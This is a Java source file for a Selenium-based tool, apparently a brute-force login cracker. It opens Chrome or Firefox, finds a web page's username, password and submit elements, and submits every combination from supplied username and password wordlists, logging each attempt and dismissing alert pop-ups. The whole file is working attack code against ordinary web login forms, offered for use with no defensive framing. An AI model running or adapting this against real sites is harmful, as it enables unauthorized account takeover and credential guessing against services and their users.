/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Controller;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;

import org.openqa.selenium.Alert;
import org.openqa.selenium.By;
import org.openqa.selenium.NoAlertPresentException;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
/**
 *
 * @author Usuario
 */
public class Driver {
    static Printer printer = new Printer();
    
    static WebDriver driver;
    static String os, cadena, cadena2;
    static WebElement Elemento, user = null, password = null, boton = null, btnprelog = null;   
    static FileReader f, r;
    static BufferedReader b, g;
    static Alert alerta;
    
    public static WebDriver Start(String browser, String file, Boolean chsave) throws IOException{
        os = System.getProperty("os.name");
        if (os.contains("Win") || os.contains("win")) {
            try {
                if (browser.equals("Chrome")) {
                    try{
                        System.setProperty("webdriver.chrome.driver", System.getProperty("user.dir")+"\\"+"Drivers\\chromedriver\\chromedriver.exe");
                        driver = new ChromeDriver();
                        driver.manage().window().maximize();
                    }catch(Exception e){}
                }else{
                    try{
                        System.setProperty("webdriver.gecko.driver", System.getProperty("user.dir")+"\\"+"Drivers\\geckodriver\\geckodriver32.exe");
                        driver = new FirefoxDriver();
                        driver.manage().window().maximize();
                    }catch(Exception e){
                        System.setProperty("webdriver.gecko.driver", System.getProperty("user.dir")+"\\"+"Drivers\\geckodriver\\geckodriver32.exe");
                        driver = new FirefoxDriver();
                        driver.manage().window().maximize();
                    }
                }
            } catch (Exception e) {
                printer.print(3, "Browser "+e.getMessage(), file, chsave);
            }   
        }else if(os.contains("nux") || os.contains("nix")){
            try {
                if (browser.equals("Chrome")) {
                    try{
                        System.setProperty("webdriver.chrome.driver", System.getProperty("user.dir")+"/Drivers/chromedriver/chromedriver");
                        driver = new ChromeDriver();
                        driver.manage().window().maximize();
                    }catch(Exception e){
                        printer.print(3, "Driver "+e.getMessage(), file, chsave);
                    }
                }else{
                    try{
                        System.setProperty("webdriver.gecko.driver", System.getProperty("user.dir")+"/Drivers/geckodriver/geckodriver");
                        System.out.println(System.getProperty("user.dir")+"/Drivers/geckodriver/geckodriver");
                        driver = new FirefoxDriver();
                        driver.manage().window().maximize();
                    }catch(Exception e){
                        printer.print(3, "Driver "+e.getMessage(), file, chsave);
                    }
                }
            } catch (Exception e) {
                printer.print(3, "Browser "+e.getMessage(), file, chsave);
            } 
        }else{
            printer.print(3, "OS without Support.", file, chsave);
        }
        return driver; 
    }
    
    public static void Stop(){
        driver.close();  
        driver.quit();
    }
    
    public static void login(WebDriver driver,String url, String file, Boolean chsave) throws IOException{
        try {
            driver.navigate().to(url);
            printer.print(1, "Accessing to '"+url+"'.", file, chsave);
        } catch (Exception e) {
            printer.print(3, "Couldn't Access to '"+url+"'.", file, chsave);
        }
    }
    
    public static WebElement Find(WebDriver driver, String idtype, String id, String file, Boolean chsave) throws IOException{
        Elemento = null;
        try{
            switch(idtype){
                case "ID":
                    Elemento = driver.findElement(By.id(id));
                case "Class Name":
                    Elemento = driver.findElement(By.className(id));
                case "Name":
                    Elemento = driver.findElement(By.name(id));
                case "XPath":
                    Elemento = driver.findElement(By.xpath(id));
            }
        }catch(Exception e){
        }
        return  Elemento;         
    }
    
    public static void Attack(WebDriver driver, String tpuser, String txtuser, String tppassword, String txtpassword, String tpboton, String txtboton, String users, String pwds, Boolean check, Integer targetUsers, Integer targetPwds, Boolean bblog, String[] datosbblog, Boolean chreload, String file, Boolean chsave)throws InterruptedException, FileNotFoundException, IOException{
        if(!check){
            //if targetUsers is equal to 0, users = single else users= list
            //if targetPwds is equal to 0, pwds = single else pwds= list
            if(targetUsers == 0 & targetPwds == 0){
                if (bblog) {
                    BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                }
                user = Find(driver, tpuser, txtuser, file, chsave);
                password = Find(driver, tppassword, txtpassword, file, chsave);
                boton = Find(driver, tpboton, txtboton, file, chsave);
                try {
                    user.clear();
                } catch (Exception e) {
                }
                user.sendKeys(users);
                password.clear();
                password.sendKeys(pwds);
                boton.click();
                printer.print(1, "trying user: "+users+" and password: "+pwds, file, chsave);
            }else if(targetUsers == 1 & targetPwds == 0){
                f = new FileReader(users);
                b = new BufferedReader(f);
                if (bblog && !chreload) {
                    BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                }
                while ((cadena = b.readLine())!=null) {
                    if (bblog && chreload) {
                        BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                    }
                    user = Find(driver, tpuser, txtuser, file, chsave);
                    password = Find(driver, tppassword, txtpassword, file, chsave);
                    boton = Find(driver, tpboton, txtboton, file, chsave); 
                    try {
                        user.clear();
                    } catch (Exception e) {
                    }
                    user.sendKeys(cadena);
                    password.clear();
                    password.sendKeys(pwds);
                    boton.click();
                    printer.print(1, "trying user: "+cadena+" and password: "+pwds, file, chsave);
                }
                b.close();
            }else if(targetUsers == 0 & targetPwds == 1){
                f = new FileReader(pwds);
                b = new BufferedReader(f);
                if (bblog && !chreload) {
                    BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                }
                while ((cadena = b.readLine())!=null) {  
                    if (bblog && chreload) {
                        BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                    }
                    user = Find(driver, tpuser, txtuser, file, chsave);
                    password = Find(driver, tppassword, txtpassword, file, chsave);
                    boton = Find(driver, tpboton, txtboton, file, chsave);
                    try {
                        user.clear();
                    } catch (Exception e) {
                    }
                    user.sendKeys(users);
                    password.clear();
                    password.sendKeys(cadena);
                    boton.click();
                    printer.print(1, "trying user: "+users+" and password: "+cadena, file, chsave);
                }
                b.close();
            }else if(targetUsers == 1 & targetPwds == 1){
                f = new FileReader(users);
                b = new BufferedReader(f);
                if (bblog && !chreload) {
                    BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                }
                while ((cadena = b.readLine())!=null) {   
                    r = new FileReader(pwds);
                    g = new BufferedReader(r);
                    while ((cadena2 = g.readLine())!=null) {   
                        if (bblog && chreload) {
                            BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                        }
                        user = Find(driver, tpuser, txtuser, file, chsave);
                        password = Find(driver, tppassword, txtpassword, file, chsave);
                        boton = Find(driver, tpboton, txtboton, file, chsave);
                        try {
                            user.clear();
                        } catch (Exception e) {
                        }
                        
                        try {
                            user.sendKeys(cadena);
                            password.clear();
                            password.sendKeys(cadena2);
                            boton.click();
                            printer.print(1, "trying user: "+cadena+" and password: "+cadena2, file, chsave);
                        } catch (Exception e) {
                            //System.err.println("------ error final: "+e.getMessage()+" ------- ");
                            if (e.getMessage().contains("is not attached")) {
                                System.out.println("finish");
                            }
                        }
                            
                    }
                    g.close();
                }
                b.close();
            }
        }else{
            //if targetUsers is equal to 0, users = single else users= list
            //if targetPwds is equal to 0, pwds = single else pwds= list
            if(targetUsers == 0 & targetPwds == 0){
                if (bblog) {
                    BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                }
                user = Find(driver, tpuser, txtuser, file, chsave);
                password = Find(driver, tppassword, txtpassword, file, chsave);
                boton = Find(driver, tpboton, txtboton, file, chsave);
                try {
                    user.clear();
                } catch (Exception e) {
                }
                user.sendKeys(users);
                password.clear();
                password.sendKeys(pwds);
                boton.click();
                printer.print(1, "trying user: "+users+" and password: "+pwds, file, chsave);
                alerta = capturarAlert(10);
	        try {
                   alerta.accept(); 
                } catch (Exception e) {
                    alerta.dismiss();
                }
            }else if(targetUsers == 1 & targetPwds == 0){
                f = new FileReader(users);
                b = new BufferedReader(f);
                if (bblog && !chreload) {
                    BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                }
                while ((cadena = b.readLine())!=null) { 
                    if (bblog && chreload) {
                        BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                    }
                    user = Find(driver, tpuser, txtuser, file, chsave);
                    password = Find(driver, tppassword, txtpassword, file, chsave);
                    boton = Find(driver, tpboton, txtboton, file, chsave);
                    try {
                        user.clear();
                    } catch (Exception e) {
                    }
                    user.sendKeys(cadena);
                    password.clear();
                    password.sendKeys(pwds);
                    boton.click();
                    printer.print(1, "trying user: "+cadena+" and password: "+pwds, file, chsave);
                    alerta = capturarAlert(10);
                    try {
                       alerta.accept(); 
                    } catch (Exception e) {
                        alerta.dismiss();
                    }
                }
                b.close();
            }else if(targetUsers == 0 & targetPwds == 1){
                f = new FileReader(pwds);
                b = new BufferedReader(f);
                if (bblog && !chreload) {
                    BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                }
                while ((cadena = b.readLine())!=null) {  
                    if (bblog && chreload) {
                        BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                    }
                    user = Find(driver, tpuser, txtuser, file, chsave);
                    password = Find(driver, tppassword, txtpassword, file, chsave);
                    boton = Find(driver, tpboton, txtboton, file, chsave);
                    try {
                        user.clear();
                    } catch (Exception e) {
                    }
                    user.sendKeys(users);
                    password.clear();
                    password.sendKeys(cadena);
                    boton.click();
                    printer.print(1, "trying user: "+users+" and password: "+cadena, file, chsave);
                    alerta = capturarAlert(10);
                    try {
                       alerta.accept(); 
                    } catch (Exception e) {
                        alerta.dismiss();
                    }
                }
                b.close();
            }else if(targetUsers == 1 & targetPwds == 1){
                f = new FileReader(users);
                b = new BufferedReader(f);
                if (bblog && !chreload) {
                    BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                }
                while ((cadena = b.readLine())!=null) {   
                    r = new FileReader(pwds);
                    g = new BufferedReader(r);
                    while ((cadena2 = g.readLine())!=null) {  
                        if (bblog && chreload) {
                            BtnPrelog(driver, datosbblog[0], datosbblog[1], file, chsave);
                        }
                        user = Find(driver, tpuser, txtuser, file, chsave);
                        password = Find(driver, tppassword, txtpassword, file, chsave);
                        boton = Find(driver, tpboton, txtboton, file, chsave);
                        try {
                            user.clear();
                        } catch (Exception e) {
                        }
                        user.sendKeys(cadena);
                        password.clear();
                        password.sendKeys(cadena2);
                        boton.click();
                        printer.print(1, "trying user: "+cadena+" and password: "+cadena2, file, chsave);
                        alerta = capturarAlert(10);
                        try {
                           alerta.accept(); 
                        } catch (Exception e) {
                            alerta.dismiss();
                        }
                    }
                    g.close();
                }
                b.close();
            }
        }
    }
        
    
    public static Alert capturarAlert(int Tiempo){
        int i=0;
	Alert alert = null;
	boolean isPresente = false;
	while(i++<Tiempo)
	{
            try{
		alert = driver.switchTo().alert();
		isPresente = true;
		break;
	    }catch(NoAlertPresentException e){
		try {
		    Thread.sleep(1000);
		} catch (InterruptedException e1) {
		    e1.printStackTrace();
		}
		continue;
	    }
	}
        return alert;
    }
    
    public static void BtnPrelog(WebDriver driver, String tpid, String id, String file, Boolean chsave) throws InterruptedException, IOException{
        btnprelog = Find(driver, tpid, id, file, chsave);
        btnprelog.click();
        Thread.sleep(2000);
    }
    
    
}
